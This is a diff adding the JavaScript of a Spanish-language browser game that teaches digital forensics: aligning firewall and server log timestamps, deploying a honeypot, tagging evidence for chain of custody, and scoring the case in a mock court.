+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px; margin-top:15px;">
+                <div style="background:rgba(255,255,255,0.03); padding:10px; border-radius:5px;">
+                    <strong style="color:var(--log-info)"><i class="fa-solid fa-clock"></i> 1. EL TIEMPO (NTP)</strong>
+                    <p style="font-size:0.9rem">En un juicio, si el Firewall dice que el ataque fue a las 10:00 y el Servidor a las 10:05, el caso se desestima. Usa los controles NTP para alinear la evidencia.</p>
+                </div>
+                <div style="background:rgba(255,255,255,0.03); padding:10px; border-radius:5px;">
+                    <strong style="color:var(--log-warn)"><i class="fa-solid fa-spider"></i> 2. LA TRAMPA (Honey Pot)</strong>
+                    <p style="font-size:0.9rem">A veces los logs normales no bastan. Despliega señuelos (Honey Pots). Si alguien los toca, es culpable por definición. Úsalo para revelar lo invisible.</p>
+                </div>
+            </div>
+
+            <p style="margin-top:15px;">Y recuerda: Mantén la <strong>Cadena de Custodia</strong>. Etiqueta, no toques.</p>
+        `);
+        showModal("ENTRENAMIENTO INICIAL", html, "ACCEDER A CONSOLA");
+    }
+
+    function renderCaseList() {
+        const list = document.getElementById('case-list');
+        list.innerHTML = '';
+        CASES.forEach(c => {
+            const div = document.createElement('div');
+            div.className = 'case-item';
+            div.id = `case-item-${c.id}`;
+            
+            let statusHtml = '';
+            if(c.solved) {
+                statusHtml = `<span class="status-badge status-solved">RESUELTO</span>`;
+            } else {
+                statusHtml = `<span class="status-badge status-pending">PENDIENTE</span>`;
+            }
+
+            div.innerHTML = `
+                <span class="case-title"><i class="fa-solid fa-folder"></i> ${c.title}</span>
+                <div class="case-meta">
+                    <span>${c.type}</span>
+                    <span id="status-${c.id}-container">${statusHtml}</span>
+                </div>`;
+            div.onclick = () => loadCase(c.id);
+            list.appendChild(div);
+        });
+    }
+
+    function loadCase(id) {
+        currentCase = CASES.find(c => c.id === id);
+        evidence = [];
+        honeyPotDeployed = false;
+        clickedLogData = null;
+        
+        document.querySelectorAll('.case-item').forEach(el => el.classList.remove('active'));
+        document.getElementById(`case-item-${id}`).classList.add('active');
+        
+        document.getElementById('case-id').innerText = `#${id} ${currentCase.type.toUpperCase()}`;
+        document.getElementById('evidence-req').innerText = currentCase.solution.tagCount;
+        
+        // Reset Tools
+        document.getElementById('offset-fw').value = 0;
+        document.getElementById('offset-auth').value = 0;
+        document.getElementById('offset-fw-val').innerText = "0s";
+        document.getElementById('offset-auth-val').innerText = "0s";
+        
+        const btnHoney = document.getElementById('btn-honeypot');
+        btnHoney.disabled = false;
+        btnHoney.innerHTML = `<i class="fa-solid fa-network-wired"></i> DESPLEGAR SEÑUELO`;
+        btnHoney.style.borderColor = "var(--log-warn)";
+        btnHoney.style.color = "var(--log-warn)";
+        
+        updateEvidenceList();
+
+        // Clone logs to avoid modifying original data
+        activeLogs = currentCase.logs.map((l, index) => ({...l, id: index, currentOffset: 0}));
+        renderLogs();
+
+        showModal(`NUEVO CASO: ${currentCase.title}`, formatText(currentCase.brief), "INICIAR");
+    }
+
+    function renderLogs() {
+        const container = document.getElementById('log-window');
+        container.innerHTML = '';
+        
+        const fwOffset = parseInt(document.getElementById('offset-fw').value);
+        const authOffset = parseInt(document.getElementById('offset-auth').value);
+        
+        const displayLogs = activeLogs.map(l => {
+            let totalOffset = l.offset || 0; 
+            // Apply NTP correction based on source type
+            if (l.src.includes("FW") || l.src.includes("ROUTER")) totalOffset += fwOffset;
+            if (l.src.includes("AUTH") || l.src.includes("DB") || l.src.includes("SERVER") || l.src.includes("WEB")) totalOffset += authOffset;
+
+            let [h, m, s] = l.time.split(':').map(Number);
+            let timeObj = new Date(2024, 0, 1, h, m, s);
+            timeObj.setSeconds(timeObj.getSeconds() + totalOffset);
+            
+            let timeStr = timeObj.toTimeString().split(' ')[0];
+            
+            return { ...l, displayTime: timeStr, realOrder: timeObj.getTime(), currentShift: totalOffset !== (l.offset || 0) };
+        }).sort((a,b) => a.realOrder - b.realOrder);
+
+        const filter = document.getElementById('log-filter').value.toLowerCase();
+
+        displayLogs.forEach(l => {
+            if (filter && !l.msg.toLowerCase().includes(filter) && !l.src.toLowerCase().includes(filter)) return;
+
+            const div = document.createElement('div');
+            const isTagged = evidence.includes(l.id);
+            const isFW = l.src.includes("FW") || l.src.includes("ROUTER");
+            const isAuth = l.src.includes("AUTH") || l.src.includes("DB") || l.src.includes("SERVER");
+            
+            // Add shifting classes for visual feedback
+            let shiftClass = "";
+            if (isFW && fwOffset !== 0) shiftClass = "shifting-fw";
+            if (isAuth && authOffset !== 0) shiftClass = "shifting-auth";
+
+            div.className = `log-line log-${l.type} ${isTagged ? 'tagged' : ''} ${shiftClass}`;
+            div.onclick = () => openLogDetail(l);
+
+            const icon = isTagged ? '<i class="fa-solid fa-tag" style="color:var(--accent)"></i> ' : '';
+            const honeyIcon = l.src === "HONEYPOT" ? '<i class="fa-solid fa-spider" style="color:var(--log-warn)"></i> ' : '';
+
+            div.innerHTML = `
+                <span class="ts">${l.displayTime}</span>
+                <span class="src">${l.src}</span>
+                <span class="evt">${honeyIcon}${icon}${l.msg}</span>
+            `;
+            container.appendChild(div);
+        });
+    }
+
+    /* --- LUPA FORENSE (MODAL) --- */
+    function openLogDetail(log) {
+        clickedLogData = log;
+        const info = analyzeLog(log);
+        const isTagged = evidence.includes(log.id);
+        
+        const btnText = isTagged ? "QUITAR ETIQUETA" : "ETIQUETAR COMO EVIDENCIA";
+        const btnIcon = isTagged ? "fa-trash" : "fa-tag";
+        const btnStyle = isTagged ? "border-color:var(--log-crit); color:var(--log-crit);" : "background:var(--accent-dim); border-color:var(--accent); color:var(--accent);";
+        
+        const html = `
+            <div style="background:#000; padding:15px; border:1px solid var(--border); margin-bottom:20px; font-family:var(--font-mono);">
+                <div style="color:var(--text-muted); font-size:0.8rem;">LOG RAW DATA:</div>
+                <div style="color:var(--accent); margin-top:5px;">${log.displayTime} | ${log.src}</div>
+                <div style="color:#fff; margin-top:5px;">${log.msg}</div>
+            </div>
+
+            <div class="analysis-box analysis-tech">
+                <div class="analysis-title"><i class="fa-solid fa-microchip"></i> ANÁLISIS TÉCNICO</div>
+                <div class="analysis-content">${info.tech}</div>
+            </div>
+
+            <div class="analysis-box analysis-layman">
+                <div class="analysis-title"><i class="fa-solid fa-user-secret"></i> EN LENGUAJE CLARO</div>
+                <div class="analysis-content">${info.simple}</div>
+            </div>
+
+            <div class="analysis-box analysis-hint">
+                <div class="analysis-title"><i class="fa-solid fa-magnifying-glass-arrow-right"></i> CONSEJO FORENSE</div>
+                <div class="analysis-content">${info.hint}</div>
+            </div>
+        `;
+
+        const footerHtml = `
+            <button class="btn" style="${btnStyle} margin-right:auto;" onclick="toggleEvidenceFromModal()">
+                <i class="fa-solid ${btnIcon}"></i> ${btnText}
+            </button>
+            <button class="btn" onclick="closeModal()">CERRAR</button>
+        `;
+
+        showModal("LUPA FORENSE: DETALLE DE EVENTO", html, null);
+        document.getElementById('modal-footer').innerHTML = footerHtml;
+    }
+
+    window.toggleEvidenceFromModal = function() {
+        if (!clickedLogData) return;
+        const id = clickedLogData.id;
+        if (evidence.includes(id)) evidence = evidence.filter(e => e !== id);
+        else evidence.push(id);
+        
+        updateEvidenceList();
+        renderLogs();
+        closeModal();
+    };
+
+    function updateEvidenceList() {
+        const el = document.getElementById('evidence-list');
+        const count = document.getElementById('evidence-count');
+        
+        if(evidence.length === 0) {
+            el.innerHTML = '<div style="text-align:center; color:#444; padding-top:20px; font-size:0.8rem;">Sin evidencia recolectada</div>';
+        } else {
+            el.innerHTML = evidence.map(id => {
+                const log = activeLogs.find(l => l.id === id);
+                return `<div class="evidence-item">
+                            <div style="overflow:hidden; text-overflow:ellipsis; white-space:nowrap; font-size:0.75rem;">
+                                <strong style="color:var(--accent)">${log.src}</strong>: ${log.msg}
+                            </div> 
+                            <span class="evidence-tag"><i class="fa-solid fa-check"></i></span>
+                        </div>`;
+            }).join('');
+        }
+        count.innerText = `${evidence.length}`;
+    }
+
+    /* --- TOOLS --- */
+    window.updateLogs = function() {
+        document.getElementById('offset-fw-val').innerText = document.getElementById('offset-fw').value + "s";
+        document.getElementById('offset-auth-val').innerText = document.getElementById('offset-auth').value + "s";
+        renderLogs();
+    }
+
+    window.clearFilter = function() {
+        document.getElementById('log-filter').value = '';
+        renderLogs();
+    }
+    document.getElementById('log-filter').addEventListener('input', renderLogs);
+
+    window.deployHoneyPot = function() {
+        if(honeyPotDeployed) return;
+        
+        if(currentCase.solution.needsHoney && currentCase.extraLogs) {
+            const btn = document.getElementById('btn-honeypot');
+            btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> DESPLEGANDO...`;
+            btn.disabled = true;
+            
+            setTimeout(() => {
+                let startId = activeLogs.length;
+                const newLogs = currentCase.extraLogs.map((l, i) => ({...l, id: startId + i, offset: 0}));
+                activeLogs = activeLogs.concat(newLogs);
+                honeyPotDeployed = true;
+                
+                btn.innerHTML = `<i class="fa-solid fa-check"></i> SEÑUELO ACTIVO`;
+                btn.style.borderColor = "var(--status-green)";
+                btn.style.color = "var(--status-green)";
+                
+                renderLogs();
+                showModal("OPERACIÓN DECEPCIÓN EXITOSA", 
+                    "<p>El atacante ha interactuado con el <strong>Honey Pot</strong>.</p><p>Se han generado nuevos logs con la etiqueta <strong style='color:var(--log-warn)'>HONEYPOT</strong>. Estos registros contienen evidencia de alta fidelidad.</p>", 
+                    "VER LOGS");
+            }, 1500);
+        } else {
+            showModal("RESULTADO DEL DESPLIEGUE", "<p>El señuelo se ha mantenido silencioso. El atacante no ha picado o no hay movimiento lateral activo.</p>", "CONTINUAR");
+            honeyPotDeployed = true;
+            document.getElementById('btn-honeypot').disabled = true;
+        }
+    };
+
+    window.submitToCourt = function() {
+        if (!currentCase) return;
+
+        let reasons = [];
+        let score = 0;
+
+        // 1. NTP CHECK LOGIC WITH GENEROUS MARGIN OF ERROR
+        if (currentCase.solution.needsNTP) {
+            const userFwOffset = parseInt(document.getElementById('offset-fw').value);
+            const userAuthOffset = parseInt(document.getElementById('offset-auth').value);
+            
+            const targetFw = currentCase.solution.fwOffset;
+            const targetAuth = currentCase.solution.authOffset;
+            
+            // Allow +/- 15 seconds margin of error (generous)
+            const fwOk = Math.abs(userFwOffset - targetFw) <= 15;
+            const authOk = Math.abs(userAuthOffset - targetAuth) <= 15;
+
+            if (fwOk && authOk) {
+                score++;
+            } else {
+                reasons.push({
+                    icon: "fa-clock",
+                    title: "Fallo de Sincronización Temporal (NTP)",
+                    step: `Debes ajustar el tiempo. El objetivo era FW: ${targetFw}s / Auth: ${targetAuth}s. Tú pusiste FW: ${userFwOffset}s / Auth: ${userAuthOffset}s.`,
+                    why: "REALISMO: Si los logs del firewall y el servidor no coinciden en hora, un abogado defensor argumentará que son eventos distintos. La correlación exacta es vital."
+                });
+            }
+        } else {
+            score++; // No NTP needed
+        }
+
+        // 2. HONEY POT CHECK
+        if (currentCase.solution.needsHoney) {
+            if (honeyPotDeployed) score++;
+            else reasons.push({
+                icon: "fa-spider",
+                title: "Falta de Atribución (Decepción)",
+                step: "Pulsa el botón 'DESPLEGAR SEÑUELO' en el panel derecho. Necesitas que el atacante revele sus herramientas o IP real interactuando con un activo falso.",
+                why: "REALISMO: Los logs defensivos (Firewall) solo muestran intentos de entrada. Un Honey Pot captura la 'intención' y el 'modus operandi' (TTPs)."
+            });
+        } else {
+            score++;
+        }
+
+        // 3. EVIDENCE CHECK
+        if (evidence.length >= currentCase.solution.tagCount) {
+            score++;
+        } else {
+            reasons.push({
+                icon: "fa-tag",
+                title: "Ruptura de Cadena de Custodia",
+                step: "Haz clic en las líneas de log relevantes (rojas/amarillas) y pulsa 'ETIQUETAR COMO EVIDENCIA'. Necesitas asegurar al menos " + currentCase.solution.tagCount + " pruebas.",
+                why: "REALISMO: En un juicio, si no has 'preservado' y etiquetado formalmente los logs relevantes, se asume que han podido ser manipulados."
+            });
+        }
+
+        if (score >= 3) {
+            const successHtml = `
+                <div style="text-align:center; margin-bottom:20px;">
+                    <i class="fa-solid fa-scale-balanced fa-4x" style="color:var(--status-green)"></i>
+                </div>
+                <h2 style="text-align:center; color:var(--status-green); margin-bottom:15px;">¡CASO GANADO!</h2>
+                <p>Has presentado un caso sólido. La correlación de tiempos (NTP) fue perfecta y la evidencia etiquetada es irrefutable.</p>
+                <p>El atacante ha sido atribuido y procesado.</p>
+            `;
+            showModal("VEREDICTO FINAL", successHtml, "CERRAR CASO");
+            
+            // Update solved state
+            currentCase.solved = true;
+            const statusContainer = document.getElementById(`status-${currentCase.id}-container`);
+            statusContainer.innerHTML = `<span class="status-badge status-solved">RESUELTO</span>`;
+            
+        } else {
+            const failHtml = `
+                <div style="text-align:center; margin-bottom:20px;">
+                    <i class="fa-solid fa-gavel fa-4x" style="color:var(--log-crit)"></i>
+                </div>
+                <h2 style="text-align:center; color:var(--log-crit); margin-bottom:15px; font-family:var(--font-mono);">CASO DESESTIMADO POR EL JUEZ</h2>
+                <p style="text-align:center; margin-bottom:20px;">La evidencia presentada es insuficiente o técnicamente inválida. Sigue estos pasos para corregirlo:</p>
+                
+                <div style="display:flex; flex-direction:column; gap:15px;">
+                    ${reasons.map(r => `
+                        <div style="background:rgba(255,50,50,0.05); border-left:4px solid var(--log-crit); padding:15px;">
+                            <div style="color:var(--log-crit); font-weight:bold; margin-bottom:5px; font-family:var(--font-mono);">
+                                <i class="fa-solid ${r.icon}"></i> ${r.title}
+                            </div>
+                            <div style="margin-bottom:8px;"><strong style="color:var(--text-main)">CORRECCIÓN:</strong> ${r.step}</div>
+                            <div style="font-size:0.85rem; color:var(--text-muted); font-style:italic;">${r.why}</div>
+                        </div>
+                    `).join('')}
+                </div>
+            `;
+            showModal("VEREDICTO: EVIDENCIA INSUFICIENTE", failHtml, "VOLVER AL CASO");
+        }
+    };
+
+    /* --- SYSTEM --- */
+    window.toggleTheme = function() {
+        const b = document.body;
+        const current = b.getAttribute('data-theme');
+        b.setAttribute('data-theme', current === 'solarized' ? 'dark' : 'solarized');
+    };
+
+    window.showGlossary = function() {
+        let html = Object.keys(GLOSSARY).sort().map(k => `
+            <div style="margin-bottom:15px; border-bottom:1px dashed var(--border); padding-bottom:10px;">
+                <strong style="color:var(--accent); font-size:1.1rem;">${k}</strong>
+                <div style="margin-top:5px; color:var(--text-main);">${GLOSSARY[k]}</div>
+            </div>
+        `).join('');
+        showModal("GLOSARIO DE CIBERSEGURIDAD", html, "CERRAR");
+    };
+
+    window.resetGame = function() {
+        if(confirm("¿Reiniciar simulador?")) location.reload();
+    };
+
+    window.closeModal = function() { document.getElementById('modal-overlay').style.display = 'none'; };
+    
+    window.showModal = function(t, b, btn) {
+        document.getElementById('modal-title').innerHTML = t;
+        document.getElementById('modal-body').innerHTML = b;
+        if (btn) {
+            document.getElementById('modal-footer').innerHTML = `<button class="btn" onclick="closeModal()">${btn}</button>`;
+        }
+        document.getElementById('modal-overlay').style.display = 'flex';
+    };
+
+    // Start
+    init();
+
+})();
+</script>
+</body>
+</html>
